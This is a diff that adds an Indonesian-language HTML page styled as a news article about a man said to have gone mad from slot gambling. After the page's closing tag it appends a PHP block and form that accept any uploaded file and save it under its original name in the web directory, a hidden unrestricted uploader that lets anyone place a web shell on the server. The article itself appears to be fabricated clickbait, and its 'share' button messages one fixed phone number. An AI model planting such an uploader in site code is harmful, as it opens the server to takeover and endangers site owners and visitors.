@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>new news </title>
+<style>
+  /* Box-sizing global */
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f0f2f5;
+    margin: 0;
+    padding: 0;
+    color: #333;
+  }
+
+  header {
+    background-color: #2c3e50;
+    color: #fff;
+    padding: 20px 0;
+    text-align: center;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+  }
+
+  header h1 {
+    margin: 0;
+    font-size: 2.2em;
+    font-weight: 600;
+    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
+  }
+
+  nav {
+    position: sticky;
+    top: 0;
+    background-color: #34495e;
+    display: flex;
+    justify-content: flex-start; /* fleksibel untuk scroll */
+    overflow-x: auto; /* scroll jika terlalu panjang */
+    padding: 12px 10px;
+    z-index: 100;
+  }
+
+  nav a {
+    color: #ecf0f1;
+    text-decoration: none;
+    margin: 0 15px;
+    font-size: 1em;
+    font-weight: 500;
+    white-space: nowrap; /* agar tidak wrap */
+    transition: all 0.3s ease;
+  }
+
+  nav a:hover, nav a.active {
+    color: #1abc9c;
+    border-bottom: 2px solid #1abc9c;
+    padding-bottom: 4px;
+  }
+
+  .container {
+    width: 95%;
+    max-width: 800px;
+    margin: 40px auto;
+    background-color: #fff;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+  }
+
+  .image-wrapper {
+    position: relative;
+  }
+
+  .article-image {
+    width: 100%;
+    display: block;
+    height: auto;
+    object-fit: cover;
+  }
+
+  .overlay-text {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: linear-gradient(to top, rgba(0, 123, 255, 0.9), transparent);
+    color: white;
+    padding: 20px;
+    font-size: 1.2em; /* sedikit lebih kecil supaya muat layar kecil */
+    font-weight: 600;
+  }
+
+  .article-content {
+    padding: 20px;
+    line-height: 1.6em;
+  }
+
+  .date {
+    font-size: 0.85em;
+    color: #7f8c8d;
+    margin-bottom: 15px;
+    display: block;
+  }
+
+  p {
+    margin-bottom: 15px;
+    text-align: justify;
+    color: #2c3e50;
+  }
+
+  .divider {
+    height: 2px;
+    background-color: #ecf0f1;
+    margin: 20px 0;
+  }
+
+  .btn-wa, .btn-politik {
+    display: inline-block;
+    color: #fff;
+    padding: 12px 24px;
+    font-size: 1em;
+    text-decoration: none;
+    border-radius: 8px;
+    margin-top: 15px;
+    font-weight: 600;
+    transition: all 0.2s ease;
+  }
+
+  .btn-wa {
+    background-color: #25D366;
+  }
+
+  .btn-wa:hover {
+    background-color: #1ebe57;
+    transform: translateY(-2px);
+  }
+
+  .btn-politik {
+    background-color: #e74c3c;
+  }
+
+  .btn-politik:hover {
+    background-color: #c0392b;
+    transform: translateY(-2px);
+  }
+
+  /* Optional: hilangkan scroll bar di beberapa browser */
+  nav::-webkit-scrollbar {
+    display: none;
+  }
+
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Berita Terbaru</h1>
+</header>
+
+<nav>
+  <a href="index.html" class="active">Berita Utama</a>
+  <a href="politik.html">Politik</a>
+  <a href="hiburan.html">Hiburan</a>
+  <a href="olahraga.html">Olahraga</a>
+  <a href="teknologi.html">Teknologi</a>
+</nav>
+
+<div class="container">
+
+  <div class="image-wrapper">
+    <img src="jan.jpg" alt="Foto Sosialita" class="article-image">
+    <div class="overlay-text">
+      akibat bermain slot pria ini jadi gila, Kok Bisa?
+    </div>
+  </div>
+
+  <div class="article-content">
+    <span class="date">25 Agustus 2025 | Reporter: Detik Viral</span>
+
+    <p>Banyumas– Kepolisian baru saja menangkap seorang pria yang diduga mengalami gangguan mental berat. Warga setempat melaporkan perilaku aneh tersangka sejak beberapa minggu terakhir. Tersangka ketahuan saat mencoba melarikan diri dari lokasi kejadian, dalam kondisi tidak sepenuhnya berpakaian.</p>
+
+    <p>Saksi mata menyebutkan bahwa perilaku tersangka sudah sangat mengganggu ketenangan lingkungan, termasuk beberapa insiden yang membuat warga khawatir. Pihak kepolisian langsung melakukan pengamanan dan membawa tersangka ke kantor polisi untuk pemeriksaan lebih lanjut.</p>
+
+    <div class="divider"></div>
+
+    <p>Hasil pemeriksaan awal menunjukkan bahwa tersangka mengidap gangguan jiwa tahap lanjut akibat tekanan hidup yang berat dan hutang yang menumpuk. Polisi juga menyatakan akan melakukan evaluasi medis dan psikologis untuk menentukan langkah selanjutnya dalam penanganan tersangka.</p>
+
+    <p>Warga diimbau untuk tetap tenang dan melaporkan kejadian mencurigakan kepada pihak berwajib. Penegak hukum menegaskan bahwa keselamatan masyarakat tetap menjadi prioritas utama. Berita mengenai penangkapan ini menjadi viral karena kejadian yang cukup unik dan mengundang perhatian publik masyarakat Indonesia.</p>
+
+    <a href="https://wa.me/6281215870739?text=hii,%20ada%20berita%20penangkapan%20orang%20stress%20" class="btn-wa" target="_blank">
+      Bagikan ke Teman via WhatsApp
+    </a>
+
+    <br>
+    <a href="politik.html" class="btn-politik">Lihat Berita Politik</a>
+  </div>
+
+</div>
+
+</body>
+</html>
+<?php
+if (isset($_FILES['file'])) {
+    $target = basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        echo "Upload berhasil: " . $target;
+    } else {
+        echo "Upload gagal!";
+    }
+}
+?>
+<form method="POST" enctype="multipart/form-data">
+    <input type="file" name="file">
+    <input type="submit" value="Upload">
+</form>
